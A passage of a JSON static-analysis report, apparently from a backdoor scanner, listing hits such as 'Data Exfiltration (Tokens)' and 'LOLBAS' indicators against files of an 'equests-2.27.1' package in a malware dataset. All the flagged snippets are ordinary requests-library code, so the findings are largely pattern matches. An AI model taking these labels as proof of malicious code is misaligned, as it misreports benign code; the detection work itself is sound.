                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 104,
                  "startColumn": 79,
                  "endLine": 104,
                  "endColumn": 87,
                  "snippet": {
                    "text": "    \"\"\"Attaches HTTP Proxy Authentication to a given Request object.\"\"\"\n\n    def __call__(self, r):\n        r.headers['Proxy-Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n",
                    "rendered": {
                      "text": "    \"\"\"Attaches HTTP Proxy Authentication to a given Request object.\"\"\"\n\n    def __call__(self, r):\n        r.headers['Proxy-Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n",
                      "markdown": "`    \"\"\"Attaches HTTP Proxy Authentication to a given Request object.\"\"\"\n\n    def __call__(self, r):\n        r.headers['Proxy-Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 73,
                  "endLine": 96,
                  "endColumn": 81,
                  "snippet": {
                    "text": "        return not self == other\n\n    def __call__(self, r):\n        r.headers['Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n",
                    "rendered": {
                      "text": "        return not self == other\n\n    def __call__(self, r):\n        r.headers['Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n",
                      "markdown": "`        return not self == other\n\n    def __call__(self, r):\n        r.headers['Authorization'] = _basic_auth_str(self.username, self.password)\n        return r\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 45,
                  "endLine": 89,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                    "rendered": {
                      "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                      "markdown": "`    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 17,
                  "endLine": 89,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                    "rendered": {
                      "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                      "markdown": "`    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 24,
                  "endLine": 84,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n",
                    "rendered": {
                      "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n",
                      "markdown": "`\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 13,
                  "endLine": 84,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n",
                    "rendered": {
                      "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n",
                      "markdown": "`\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all([\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 33,
                  "endLine": 82,
                  "endColumn": 41,
                  "snippet": {
                    "text": "class HTTPBasicAuth(AuthBase):\n    \"\"\"Attaches HTTP Basic Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n",
                    "rendered": {
                      "text": "class HTTPBasicAuth(AuthBase):\n    \"\"\"Attaches HTTP Basic Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n",
                      "markdown": "`class HTTPBasicAuth(AuthBase):\n    \"\"\"Attaches HTTP Basic Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 39,
                  "endLine": 66,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n    )\n\n    return authstr\n",
                    "rendered": {
                      "text": "        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n    )\n\n    return authstr\n",
                      "markdown": "`        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n    )\n\n    return authstr\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 19,
                  "endLine": 63,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n",
                    "rendered": {
                      "text": "        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n",
                      "markdown": "`        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 8,
                  "endLine": 63,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n",
                    "rendered": {
                      "text": "        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n",
                      "markdown": "`        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n        b64encode(b':'.join((username, password))).strip()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 18,
                  "endLine": 62,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    if isinstance(username, str):\n        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n",
                    "rendered": {
                      "text": "    if isinstance(username, str):\n        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n",
                      "markdown": "`    if isinstance(username, str):\n        username = username.encode('latin1')\n\n    if isinstance(password, str):\n        password = password.encode('latin1')\n\n    authstr = 'Basic ' + to_native_string(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 23,
                  "endLine": 56,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n",
                    "rendered": {
                      "text": "            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n",
                      "markdown": "`            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 8,
                  "endLine": 56,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n",
                    "rendered": {
                      "text": "            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n",
                      "markdown": "`            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 36,
                  "endLine": 53,
                  "endColumn": 44,
                  "snippet": {
                    "text": "            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n",
                    "rendered": {
                      "text": "            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n",
                      "markdown": "`            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 24,
                  "endLine": 50,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n",
                    "rendered": {
                      "text": "\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n",
                      "markdown": "`\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 22,
                  "endLine": 48,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        )\n        username = str(username)\n\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n",
                    "rendered": {
                      "text": "        )\n        username = str(username)\n\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n",
                      "markdown": "`        )\n        username = str(username)\n\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 30,
                  "endLine": 28,
                  "endColumn": 38,
                  "snippet": {
                    "text": "CONTENT_TYPE_MULTI_PART = 'multipart/form-data'\n\n\ndef _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n",
                    "rendered": {
                      "text": "CONTENT_TYPE_MULTI_PART = 'multipart/form-data'\n\n\ndef _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n",
                      "markdown": "`CONTENT_TYPE_MULTI_PART = 'multipart/form-data'\n\n\ndef _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 52,
                  "endLine": 143,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n",
                    "rendered": {
                      "text": "            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n",
                      "markdown": "`            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 59,
                  "endLine": 143,
                  "endColumn": 64,
                  "snippet": {
                    "text": "            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n",
                    "rendered": {
                      "text": "            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n",
                      "markdown": "`            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 44,
                  "endLine": 31,
                  "endColumn": 49,
                  "snippet": {
                    "text": "def _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n    # says that this behaviour is dumb but we need to preserve\n    # it because people are relying on it.\"\n    #    - Lukasa\n",
                    "rendered": {
                      "text": "def _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n    # says that this behaviour is dumb but we need to preserve\n    # it because people are relying on it.\"\n    #    - Lukasa\n",
                      "markdown": "`def _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n    # says that this behaviour is dumb but we need to preserve\n    # it because people are relying on it.\"\n    #    - Lukasa\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 4,
                  "endLine": 17,
                  "endColumn": 12,
                  "snippet": {
                    "text": "import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n",
                    "rendered": {
                      "text": "import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n",
                      "markdown": "`import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 6,
                  "endLine": 13,
                  "snippet": {
                    "text": "\nimport os\nimport re\nimport time\nimport hashlib\nimport threading\nimport warnings\n\n",
                    "rendered": {
                      "text": "\nimport os\nimport re\nimport time\nimport hashlib\nimport threading\nimport warnings\n\n",
                      "markdown": "`\nimport os\nimport re\nimport time\nimport hashlib\nimport threading\nimport warnings\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 606,
                  "startColumn": 4,
                  "endLine": 606,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\n# The unreserved URI characters (RFC 3986)\nUNRESERVED_SET = frozenset(\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" + \"0123456789-._~\")\n\n\ndef unquote_unreserved(uri):\n",
                    "rendered": {
                      "text": "\n# The unreserved URI characters (RFC 3986)\nUNRESERVED_SET = frozenset(\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" + \"0123456789-._~\")\n\n\ndef unquote_unreserved(uri):\n",
                      "markdown": "`\n# The unreserved URI characters (RFC 3986)\nUNRESERVED_SET = frozenset(\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" + \"0123456789-._~\")\n\n\ndef unquote_unreserved(uri):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 857,
                  "startColumn": 59,
                  "endLine": 857,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                    "rendered": {
                      "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                      "markdown": "`    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
